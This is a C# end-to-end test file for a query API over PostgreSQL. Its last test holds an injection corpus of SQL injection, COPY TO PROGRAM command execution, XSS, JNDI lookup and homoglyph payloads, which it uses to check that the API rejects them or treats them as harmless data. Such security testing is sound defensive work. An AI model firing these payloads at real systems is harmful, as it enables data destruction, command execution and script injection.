using System.Globalization;
using System.Net;
using System.Text;
using System.Text.Json;
using Bank.Accounts;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Npgsql;
using SourceFlow.AspNetCore;
using SourceFlow.Hosting;
using SourceFlow.Query;
using SourceFlow.Storage.PostgreSQL;
using SourceFlow.Storage.Tests.PostgreSql;

namespace SourceFlow.EndToEnd.Tests;

/// <summary>
/// QRY-53..59 (plan 06 §4; doc 14 §9, §12; WP-4.2/4.7): the per-service query API end to end, over HTTP on a test server,
/// on PostgreSQL with the Bank sample. Both syntaxes, validate without execution, explain with placeholders only,
/// read-your-writes across the API, and the injection corpus with zero database errors and no writes.
/// </summary>
[Collection(PostgreSqlCollection.Name)]
[Trait("Category", "EndToEnd")]
[Trait("Requires", "Docker")]
public sealed class QueryApiScenarios(PostgreSqlServer postgreSql) : IAsyncLifetime
{
    private const string Summary = "from readmodel \"account-summary\"";
    private readonly string _schema = PostgreSqlServer.NewSchema("qapi");
    private readonly List<string> _errors = [];
    private WebApplication _app = null!;
    private HttpClient _client = null!;

    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    public async ValueTask InitializeAsync()
    {
        await postgreSql.EnsureStartedAsync();
        (_app, _client) = await StartAsync(SourceFlowRoles.All);
        foreach ((string holder, decimal balance) in new[] { ("Ada", 20m), ("Grace", 900m), ("<script>alert(1)</script>", 55m), ("Linus", 300m) })
        {
            (await CommandAsync(_client, holder, balance)).EnsureSuccessStatusCode();
        }

        await EventuallyAsync(async () => (await RowsAsync(Summary + " | summarize n = count()"))[0][0].GetInt64() == 4, "four summaries");
    }

    public async ValueTask DisposeAsync()
    {
        _client.Dispose();
        await _app.DisposeAsync();
    }

    [Fact]
    [Trait("Id", "QRY-53")]
    [Trait("Covers", "doc 14 9.1;doc 14 5.10")]
    public async Task BothSyntaxes_OverHttp_GiveTheSameRows_FromThePostgreSqlEngine()
    {
        JsonElement[] pipeline = await RowsAsync(Summary + " | where balance >= 100 | project balance, status | order by balance desc");
        JsonElement[] sql = await RowsAsync("SELECT balance, status FROM readmodel.\"account-summary\" WHERE balance >= 100 ORDER BY balance DESC", language: "sql");
        JsonDocument plan = await JsonAsync(await PostAsync("/query/explain", Body(Summary + " | where balance >= 100 | project balance")));

        pipeline.Select(r => r.GetRawText()).ShouldBe(sql.Select(r => r.GetRawText()));
        pipeline.Select(r => decimal.Parse(r[0].ToString(), CultureInfo.InvariantCulture)).ShouldBe([900m, 300m]);   // decimals travel as strings
        plan.RootElement.GetProperty("engine").GetString().ShouldBe("postgresql");
    }

    [Fact]
    [Trait("Id", "QRY-54")]
    [Trait("Covers", "doc 14 9.1")]
    public async Task Validate_DoesNotExecute()
    {
        // The documents table's scan counters prove the measurement first: a real query moves them.
        long before = await ScansAsync();
        await RowsAsync(Summary + " | project balance");
        await EventuallyAsync(async () => await ScansAsync() > before, "a query scans documents");

        long quiet = await StableAsync(ScansAsync);
        for (int i = 0; i < 5; i++)
        {
            HttpResponseMessage validated = await PostAsync("/query/validate", Body(Summary + " | where balance > 10 | project balance"));
            validated.StatusCode.ShouldBe(HttpStatusCode.OK);
        }

        await Task.Delay(TimeSpan.FromMilliseconds(1500), TimeProvider.System, Ct);   // statistics are flushed within a second
        (await StableAsync(ScansAsync)).ShouldBe(quiet, "validate parses, binds and checks policy without touching the database");
    }

    [Fact]
    [Trait("Id", "QRY-55")]
    [Trait("Covers", "ADR-026;doc 14 9.1")]
    public async Task Explain_ShowsPlaceholdersOnly()
    {
        const string marker = "zz-literal-7731";
        HttpResponseMessage response = await PostAsync("/query/explain", Body(Summary + $" | where status = 1 and balance > 12.5 and holder = '{marker}' | project balance"));
        JsonDocument plan = await JsonAsync(response);
        string statement = plan.RootElement.GetProperty("statement").GetString()!;

        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        statement.ShouldContain("$1");
        statement.ShouldNotContain(marker);
        statement.ShouldNotContain("12.5");
    }

    [Fact]
    [Trait("Id", "QRY-56")]
    [Trait("Covers", "doc 14 6")]
    public async Task ReadYourWrites_TokenFromACommand_IsHonouredByAQuery()
    {
        // An API-only node: it takes commands but runs no projections, so the read model lags until a worker starts.
        string schema = PostgreSqlServer.NewSchema("ryw");
        (WebApplication api, HttpClient client) = await StartAsync(SourceFlowRoles.Api, schema);
        await using (api)
        {
            using (client)
            {
                HttpResponseMessage opened = await CommandAsync(client, "Barbara", 777m);
                opened.EnsureSuccessStatusCode();
                string token = opened.Headers.GetValues(SourceFlowHeaders.Consistency).Single();
                string waiting = Body(Summary + " | where balance = 777 | project balance options (consistency = at_least(@t), timeout = 1s, on_timeout = 'stale')", parameters: new Dictionary<string, object?> { ["t"] = token });

                JsonDocument stale = await JsonAsync(await PostAsync("/query", waiting, client));
                stale.RootElement.GetProperty("rows").GetArrayLength().ShouldBe(0);
                stale.RootElement.GetProperty("consistency").GetProperty("sources")[0].GetProperty("stale").GetBoolean().ShouldBeTrue();

                // A worker node starts and runs the projection: the same token is then satisfied, and the row is there.
                (WebApplication worker, HttpClient workerClient) = await StartAsync(SourceFlowRoles.All, schema);
                await using WebApplication _ = worker;
                workerClient.Dispose();
                JsonDocument fresh = await JsonAsync(await PostAsync("/query", waiting.Replace("timeout = 1s", "timeout = 10s", StringComparison.Ordinal), client));
                fresh.RootElement.GetProperty("rows").GetArrayLength().ShouldBe(1);
                fresh.RootElement.GetProperty("consistency").GetProperty("sources")[0].GetProperty("stale").GetBoolean().ShouldBeFalse();
            }
        }
    }

    [Fact]
    [Trait("Id", "QRY-57")]
    [Trait("Id", "QRY-58")]
    [Trait("Id", "QRY-59")]
    [Trait("Covers", "ADR-026;doc 14 12")]
    public async Task InjectionCorpus_OverHttp_IsRejectedOrHarmless_WithNoDatabaseErrorAndNoWrite()
    {
        string[] statements =
        [
            "SELECT * FROM readmodel.\"account-summary\"; DROP TABLE documents",
            "SELECT * FROM readmodel.\"account-summary\" WHERE holder = 'a' -- ' OR 1=1",
            "SELECT * FROM readmodel.\"account-summary\" /* comment */",
            "SELECT usename FROM pg_catalog.pg_user",
            "SELECT * FROM information_schema.tables",
            "UPDATE readmodel.\"account-summary\" SET balance = 0",
            "DELETE FROM readmodel.\"account-summary\"",
            "SELECT * FROM readmodel.\"account-summary\" UNION SELECT * FROM readmodel.\"account-summary\"",
            "SELECT pg_sleep(10)",
            "SELECT * FROM readmodel.\"account-summary\" WHERE holder = 'a‮'",
            "SELECT * FROM readmodel.\"account-summary\" WHERE holder = 'a\u0000'",
            "SELECT balance FROM readmodel.\"аccount-summary\"",   // Cyrillic 'а'
            "SELECT * FROM \"" + _schema + "\".outbox",
            "' OR '1'='1",
            "1; COPY documents TO PROGRAM 'id'",
        ];
        string[] values =
        [
            "Open' OR '1'='1", "'; DROP TABLE documents; --", "\\'; SELECT pg_sleep(5); --", "%' OR 1=1 OR holder LIKE '%",
            "Ada' UNION SELECT usename FROM pg_user --", "<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "Аda",
            "1 AND 1=CAST((SELECT version()) AS int)", "${jndi:ldap://x/a}",
        ];
        (long Inserts, long Updates, long Deletes) writes = await StableAsync(WritesAsync);
        var bodies = new List<string>();

        foreach (string statement in statements)
        {
            HttpResponseMessage response = await PostAsync("/query", Body(statement, language: "sql"));
            string body = await response.Content.ReadAsStringAsync(Ct);
            bodies.Add(body);
            response.StatusCode.ShouldBe(HttpStatusCode.BadRequest, statement);
            string code = JsonDocument.Parse(body).RootElement.GetProperty("code").GetString()!;
            int.Parse(code.AsSpan(3, 2), CultureInfo.InvariantCulture).ShouldBeInRange(1, 2, $"{statement}: {code}");   // syntax or bind
        }

        foreach (string value in values)
        {
            var parameters = new Dictionary<string, object?> { ["v"] = value };
            foreach (string query in new[] { Summary + " | where holder = @v or holder like @v | project balance", Summary + " | where holder = @v | project balance" })
            {
                HttpResponseMessage response = await PostAsync("/query", Body(query, parameters: parameters));
                string body = await response.Content.ReadAsStringAsync(Ct);
                bodies.Add(body);
                response.StatusCode.ShouldBe(HttpStatusCode.OK, value);
                (value == "<script>alert(1)</script>" || JsonDocument.Parse(body).RootElement.GetProperty("rows").GetArrayLength() == 0).ShouldBeTrue(value);
            }
        }

        // Stored markup comes back as data, escaped in JSON and as text in CSV.
        HttpResponseMessage stored = await PostAsync("/query", Body(Summary + " | where balance = 55 | project holder"));
        bodies.Add(await stored.Content.ReadAsStringAsync(Ct));
        JsonDocument.Parse(bodies[^1]).RootElement.GetProperty("rows")[0][0].GetString().ShouldBe("<script>alert(1)</script>");

        bodies.ShouldAllBe(b => !b.Contains("<script", StringComparison.OrdinalIgnoreCase) && !b.Contains("<img", StringComparison.OrdinalIgnoreCase));
        await Task.Delay(TimeSpan.FromMilliseconds(1500), TimeProvider.System, Ct);
        (await StableAsync(WritesAsync)).ShouldBe(writes, "no statement wrote to the event, stream or document tables");
        lock (_errors)
        {
            _errors.ShouldBeEmpty("zero database errors");
        }
    }

    // ================================================================ helpers

    private async Task<(WebApplication App, HttpClient Client)> StartAsync(SourceFlowRoles roles, string? schema = null)
    {
        WebApplicationBuilder builder = WebApplication.CreateSlimBuilder();
        builder.WebHost.UseTestServer();
        builder.Logging.AddProvider(new ErrorCapture(_errors));
        builder.Services.AddSourceFlow(sf =>
        {
            sf.ServiceName = "accounts";
            sf.Roles = roles;
            sf.AddModule<AccountsModule>();
            sf.Projections(p => p.Add<AccountSummaryProjection>().Async());
            sf.UsePostgreSql(o =>
            {
                o.DataSource = postgreSql.DataSource;
                o.Schema = schema ?? _schema;
                o.AutoMigrate = true;
            });
            sf.UseInMemoryTransport();
            sf.Configure(o => o.PollInterval = TimeSpan.FromMilliseconds(50));
        });
        builder.Services.AddSourceFlowQueryApi(o =>
        {
            o.RequestsPerMinute = 10_000;
            o.Permissions = _ => QueryPermissions.Of(
            [
                QueryPermission.Adhoc, QueryPermission.ReadModels, QueryPermission.Events, QueryPermission.Validate,
                QueryPermission.Explain, QueryPermission.Schema, QueryPermission.PersonalData,
            ]);
        });
        WebApplication app = builder.Build();
        app.MapCommand<OpenAccount>("/accounts/{accountId}");
        app.MapSourceFlowQueryApi().AllowAnonymous();
        await app.StartAsync(Ct);
        return (app, app.GetTestClient());
    }

    private static Task<HttpResponseMessage> CommandAsync(HttpClient client, string holder, decimal balance)
    {
        return client.PostAsync($"/accounts/{AccountId.New()}", new StringContent(JsonSerializer.Serialize(new { holder, initialDeposit = balance }), Encoding.UTF8, "application/json"), Ct);
    }

    private Task<HttpResponseMessage> PostAsync(string path, string body, HttpClient? client = null)
    {
        return (client ?? _client).PostAsync(path, new StringContent(body, Encoding.UTF8, "application/json"), Ct);
    }

    private async Task<JsonElement[]> RowsAsync(string query, string? language = null)
    {
        HttpResponseMessage response = await PostAsync("/query", Body(query, language: language));
        string body = await response.Content.ReadAsStringAsync(Ct);
        response.StatusCode.ShouldBe(HttpStatusCode.OK, body);
        return [.. JsonDocument.Parse(body).RootElement.GetProperty("rows").EnumerateArray()];
    }

    private static async Task<JsonDocument> JsonAsync(HttpResponseMessage response)
    {
        return JsonDocument.Parse(await response.Content.ReadAsStringAsync(Ct));
    }

    private static string Body(string query, string? language = null, IReadOnlyDictionary<string, object?>? parameters = null)
    {
        var body = new Dictionary<string, object?> { ["query"] = query };
        if (language is not null)
        {
            body["language"] = language;
        }

        if (parameters is not null)
        {
            body["parameters"] = parameters;
        }

        return JsonSerializer.Serialize(body);
    }

    private async Task<long> ScansAsync()
    {
        await using NpgsqlCommand command = postgreSql.DataSource.CreateCommand(
            "SELECT pg_stat_clear_snapshot(); SELECT COALESCE(seq_scan, 0) + COALESCE(idx_scan, 0) FROM pg_stat_user_tables WHERE schemaname = @s AND relname = 'documents'");
        command.Parameters.Add(new NpgsqlParameter<string>("s", _schema));
        await using NpgsqlDataReader reader = await command.ExecuteReaderAsync(Ct);
        await reader.NextResultAsync(Ct);
        await reader.ReadAsync(Ct);
        return reader.GetInt64(0);
    }

    private async Task<(long, long, long)> WritesAsync()
    {
        await using NpgsqlCommand command = postgreSql.DataSource.CreateCommand(
            "SELECT pg_stat_clear_snapshot(); SELECT sum(n_tup_ins), sum(n_tup_upd), sum(n_tup_del) FROM pg_stat_user_tables WHERE schemaname = @s AND relname IN ('events', 'streams', 'documents')");
        command.Parameters.Add(new NpgsqlParameter<string>("s", _schema));
        await using NpgsqlDataReader reader = await command.ExecuteReaderAsync(Ct);
        await reader.NextResultAsync(Ct);
        await reader.ReadAsync(Ct);
        return (reader.GetInt64(0), reader.GetInt64(1), reader.GetInt64(2));
    }

    // Statistics reach pg_stat_user_tables up to a second after the transaction: read until two readings agree.
    private static async Task<T> StableAsync<T>(Func<Task<T>> read)
    {
        T last = await read();
        for (int i = 0; i < 20; i++)
        {
            await Task.Delay(TimeSpan.FromMilliseconds(1200), TimeProvider.System, Ct);
            T next = await read();
            if (EqualityComparer<T>.Default.Equals(next, last))
            {
                return next;
            }

            last = next;
        }

        return last;
    }

    private static async Task EventuallyAsync(Func<Task<bool>> condition, string what)
    {
        DateTimeOffset deadline = TimeProvider.System.GetUtcNow() + TimeSpan.FromSeconds(30);
        while (!await condition())
        {
            if (TimeProvider.System.GetUtcNow() > deadline)
            {
                throw new TimeoutException($"Timed out waiting for: {what}.");
            }

            await Task.Delay(TimeSpan.FromMilliseconds(100), TimeProvider.System, Ct);
        }
    }

    // Records error logs from the database driver and the query API: the corpus must produce none.
    private sealed class ErrorCapture(List<string> errors) : ILoggerProvider
    {
        public ILogger CreateLogger(string categoryName)
        {
            return new Logger(categoryName, errors);
        }

        public void Dispose()
        {
        }

        private sealed class Logger(string category, List<string> errors) : ILogger
        {
            public IDisposable? BeginScope<TState>(TState state)
                where TState : notnull
            {
                return null;
            }

            public bool IsEnabled(LogLevel logLevel)
            {
                return logLevel >= LogLevel.Error;
            }

            public void Log<TState>(LogLevel logLevel, EventId eventId, TState state, Exception? exception, Func<TState, Exception?, string> formatter)
            {
                if (logLevel >= LogLevel.Error && (exception is PostgresException || category.Contains("Query", StringComparison.Ordinal) || category.StartsWith("Npgsql", StringComparison.Ordinal)))
                {
                    lock (errors)
                    {
                        errors.Add($"{category}: {formatter(state, exception)}");
                    }
                }
            }
        }
    }
}
